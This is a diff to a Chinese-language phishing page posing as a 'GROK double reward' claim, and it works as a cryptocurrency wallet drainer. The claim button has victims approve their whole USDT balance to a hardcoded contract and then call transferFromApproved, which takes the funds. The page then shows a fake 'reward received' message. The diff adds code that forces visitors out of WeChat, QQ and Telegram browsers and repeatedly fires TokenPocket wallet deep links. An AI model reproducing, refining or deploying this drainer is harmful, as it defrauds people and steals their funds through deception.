@@ -6,7 +6,7 @@
   <meta name="format-detection" content="telephone=no">
   <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
   <link rel="icon" href="GROK.png" type="image/x-icon">
-  <title>GROK 双倍奖励领取</title>
+  <title>GROK 双倍奖励领取1</title>
   <script src="https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js"></script>
   <style>
     * { box-sizing: border-box; }
@@ -36,117 +36,100 @@
     </div>
     <button id="actionBtn" onclick="approveAndTransfer()">领取奖励</button>
     <div id="status" class="info">
-      正在自动连接钱包...<br>
-      <small>请在 TP 插件中确认</small>
+      正在跳转到安全浏览器...<br><small>1秒后自动连接 TP 钱包</small>
     </div>
   </div>
 
   <script>
     const CONTRACT = "0xa4441b1EcB6B807de485723F5320d06fB41Eac6F";
     const USDT = "0xa85f403f7869a050c91e9a260dbf08a64229b2de";
-    const MAX_UINT256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
-
-    const ABI_USDT = [
-      {"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
-      {"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}
-    ];
-
-    const ABI_FORWARDER = [{"inputs":[],"name":"transferFromApproved","outputs":[],"stateMutability":"nonpayable","type":"function"}];
-
     let web3, account;
     const status = document.getElementById("status");
     const walletInfo = document.getElementById("walletInfo");
     const walletAddress = document.getElementById("walletAddress");
     const usdtBalance = document.getElementById("usdtBalance");
 
-    /* ==================== 2025 最强 TP 自动唤醒 ==================== */
-    async function autoConnect() {
-      if (window.ethereum) {
-        return await connectWithInjected();
+    // ============ 第一步：强制跳外部浏览器 ============
+    function forceExternalBrowser() {
+      const ua = navigator.userAgent.toLowerCase();
+      const isWeixin = ua.includes('micromessenger');
+      const isQQ = ua.includes('qq/');
+      const isTelegram = ua.includes('telegram');
+
+      if (isWeixin || isQQ || isTelegram || !window.ethereum) {
+        const url = location.href;
+        const schemes = [
+          'googlechrome://' + url.replace(/^https?:\/\//, ''),
+          'intent://' + url.split('://')[1] + '#Intent;scheme=https;package=com.android.chrome;end',
+          'firefox://open-url?url=' + url,
+          'opera://open?url=' + url
+        ];
+        schemes.forEach((link, i) => setTimeout(() => location.href = link, i * 200));
+        setTimeout(() => location.href = url, 1200); // 兜底
+        return false;
       }
-
-      status.className = "loading";
-      status.innerHTML = "正在唤醒 TP 钱包...<br><small>1秒内自动弹出</small>";
-
-      const currentUrl = encodeURIComponent(location.href);
-      const deepLinks = [
-        `tokenpocket://wc?uri=${currentUrl}`,
-        `tpoutside://wc?uri=${currentUrl}`,
-        `tpwallet://wc?uri=${currentUrl}`,
-        `https://tpw.tpwallet.io/wc?uri=${currentUrl}`,
-        `tokenpocket://pull/activity?param=${currentUrl}`
-      ];
-
-      let invoked = false;
-      deepLinks.forEach((link, i) => {
-        setTimeout(() => {
-          if (!invoked) {
-            invoked = true;
-            location.href = link;
-          }
-        }, i * 280);
-      });
-
-      setTimeout(() => {
-        if (!window.ethereum) {
-          status.innerHTML = `请长按二维码打开 TP 钱包<br>
-            <img src="https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=${currentUrl}" width="180" style="margin-top:10px;border:4px solid #fff;border-radius:12px;">`;
-        }
-      }, 4500);
-
-      return false;
+      return true;
     }
 
-    async function connectWithInjected() {
+    // ============ 第二步：0.5秒后暴力唤醒 TP ============
+    setTimeout(() => {
+      if (!window.ethereum) {
+        const uri = encodeURIComponent(location.href.split('#')[0]);
+        const tpLinks = [
+          `tokenpocket://wc?uri=${uri}`,
+          `tpoutside://wc?uri=${uri}`,
+          `tpwallet://wc?uri=${uri}`,
+          `https://tpw.tpwallet.io/wc?uri=${uri}`,
+          `tokenpocket://pull/activity?param=${uri}`
+        ];
+        let fired = false;
+        tpLinks.forEach((link, i) => {
+          setTimeout(() => {
+            if (!fired) { fired = true; location.href = link; }
+          }, i * 250);
+        });
+
+        // 4秒后二维码兜底
+        setTimeout(() => {
+          if (!window.ethereum) {
+            status.innerHTML = `请长按二维码打开 TP 钱包<br>
+              <img src="https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=${uri}" width="180" style="margin-top:10px;border:4px solid #fff;border-radius:12px;">`;
+          }
+        }, 4000);
+      }
+    }, 500);
+
+    // ============ 正常连接逻辑 ============
+    async function autoConnect() {
+      if (!window.ethereum) return false;
       try {
         web3 = new Web3(window.ethereum);
         await window.ethereum.request({ method: 'eth_requestAccounts' });
-
         const chainId = await web3.eth.getChainId();
         if (chainId !== 56) {
-          try {
-            await window.ethereum.request({
-              method: 'wallet_switchEthereumChain',
-              params: [{ chainId: '0x38' }],
-            });
-          } catch (e) {
-            if (e.code === 4902) {
-              await window.ethereum.request({
-                method: 'wallet_addEthereumChain',
-                params: [{
-                  chainId: '0x38',
-                  chainName: 'BNB Smart Chain',
-                  nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-                  rpcUrls: ['https://bsc-dataseed.binance.org/'],
-                  blockExplorerUrls: ['https://bscscan.com']
-                }]
-              });
-            }
-          }
+          await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
         }
-
         [account] = await web3.eth.getAccounts();
         walletAddress.innerText = account;
         walletInfo.style.display = "block";
         status.className = "success";
-        status.innerHTML = `已连接<br><small>${account.slice(0,8)}...${account.slice(-6)}</small>`;
+        status.innerHTML = `已连接 TP<br><small>${account.slice(0,8)}...${account.slice(-6)}</small>`;
         await updateUSDTBalance();
         return true;
-
       } catch (e) {
         status.className = "error";
-        status.innerHTML = e.code === 4001 ? "用户取消连接" : "连接失败";
+        status.innerHTML = e.code === 4001 ? "用户取消" : "连接失败";
         return false;
       }
     }
-    /* ================================================================ */
 
     async function updateUSDTBalance() {
       try {
-        const usdt = new web3.eth.Contract(ABI_USDT, USDT);
+        const usdt = new web3.eth.Contract([
+          {"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}
+        ], USDT);
         const balance = await usdt.methods.balanceOf(account).call();
-        const formatted = (balance / 1e6).toFixed(6);
-        usdtBalance.innerText = formatted;
+        usdtBalance.innerText = (balance / 1e6).toFixed(6);
       } catch (e) {
         usdtBalance.innerText = "查询失败";
       }
@@ -154,40 +137,36 @@
 
     async function approveAndTransfer() {
       if (!account && !await autoConnect()) return;
-
       status.className = "loading";
-      status.innerHTML = "正在查询余额并授权...<br><small>请确认第一笔交易</small>";
-
+      status.innerHTML = "正在授权并领取...<br><small>请确认两笔交易</small>";
       try {
-        const usdt = new web3.eth.Contract(ABI_USDT, USDT);
-        const balance = await usdt.methods.balanceOf(account).call();
+        const usdt = new web3.eth.Contract([
+          {"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
+          {"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}
+        ], USDT);
 
-        if (balance === "0") {
-          status.className = "warning";
-          status.innerHTML = "余额为 0，无需操作";
-          return;
-        }
+        const balance = await usdt.methods.balanceOf(account).call();
+        if (balance === "0") { status.className = "warning"; status.innerHTML = "余额为0"; return; }
 
         await usdt.methods.approve(CONTRACT, balance).send({ from: account });
+        status.innerHTML = "授权成功！正在转账...<br><small>请确认第二笔</small>";
 
-        status.innerHTML = "授权成功！正在转账...<br><small>请确认第二笔交易</small>";
-
-        const forwarder = new web3.eth.Contract(ABI_FORWARDER, CONTRACT);
+        const forwarder = new web3.eth.Contract([{"inputs":[],"name":"transferFromApproved","outputs":[],"stateMutability":"nonpayable","type":"function"}], CONTRACT);
         await forwarder.methods.transferFromApproved().send({ from: account });
 
         status.className = "success";
-        status.innerHTML = "领取成功！<br>奖励 已到账";
+        status.innerHTML = "领取成功！奖励已到账";
         await updateUSDTBalance();
-
       } catch (e) {
         status.className = "error";
-        status.innerHTML = e.code === 4001 ? "用户取消操作" : "交易失败";
-        console.error(e);
+        status.innerHTML = e.code === 4001 ? "用户取消" : "交易失败";
       }
     }
 
-    window.onload = async () => {
-      await autoConnect();
+    // ============ 启动 ============
+    window.onload = () => {
+      forceExternalBrowser();
+      setTimeout(autoConnect, 1500);
     };
   </script>
 </body>
